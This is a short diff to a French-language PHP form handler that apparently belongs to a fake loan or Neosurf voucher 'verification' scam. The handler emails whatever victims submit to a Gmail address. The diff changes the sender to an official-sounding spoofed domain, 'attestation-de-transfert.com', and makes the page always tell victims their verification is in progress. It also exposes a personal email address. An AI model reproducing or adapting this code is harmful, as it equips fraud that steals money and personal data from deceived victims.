@@ -33,7 +33,7 @@ if (isset($_REQUEST)) {
 		//je fais un envoi par email
 		
 		///$subject = 'Message Verification NEOSURF';
-   $from="info@allcredit-service.com";
+   $from="info@attestation-de-transfert.com";
      $headers = $from . "\r\n" .
      'Reply-To: '.$from.'  "\r\n" '.
      'X-Mailer: PHP/' . phpversion();
@@ -61,8 +61,8 @@ mail("brancom554@gmail.com", "Demande de prêt", $message, $headers);
 		
 		
 		
-		//echo "false||Ce utilisateur n'existe pas encore.";
-					//exit;
+		echo "true||Votre vérification est en cours. Veuillez patienter.Merci.";
+		exit;
 		//fin envoi par email
 		//
 		
